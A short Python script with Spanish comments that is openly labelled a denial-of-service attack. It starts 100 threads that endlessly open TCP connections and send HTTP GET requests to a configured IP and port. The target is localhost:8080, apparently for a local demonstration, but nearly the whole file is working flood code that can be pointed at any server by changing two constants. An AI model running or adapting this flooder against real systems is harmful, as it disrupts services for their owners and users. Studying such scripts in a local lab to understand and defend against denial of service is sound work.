import socket
import threading

# --- Configuración del Ataque ---
TARGET_IP = "127.0.0.1"  # La IP de localhost
TARGET_PORT = 8080         # El puerto de nuestro servidor
NUM_ATACANTES = 100        # Número de conexiones simultáneas que lanzaremos

print("Iniciando ataque DoS...")

def atacar():
    while True:
        try:
            # Creamos un socket (un punto de conexión)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            # Intentamos conectar al servidor
            s.connect((TARGET_IP, TARGET_PORT))
            print(f"Conexión establecida a {TARGET_IP}:{TARGET_PORT}")
            # Mantenemos la conexión abierta enviando datos basura
            s.send(str.encode("GET / HTTP/1.1\r\nHost: localhost\r\n\r\n"))
        except Exception as e:
            print(f"Error: {e}")

# Creamos y lanzamos los hilos (nuestros atacantes)
for i in range(NUM_ATACANTES):
    thread = threading.Thread(target=atacar)
    thread.start()

print(f"Ataque lanzado con {NUM_ATACANTES} hilos.")
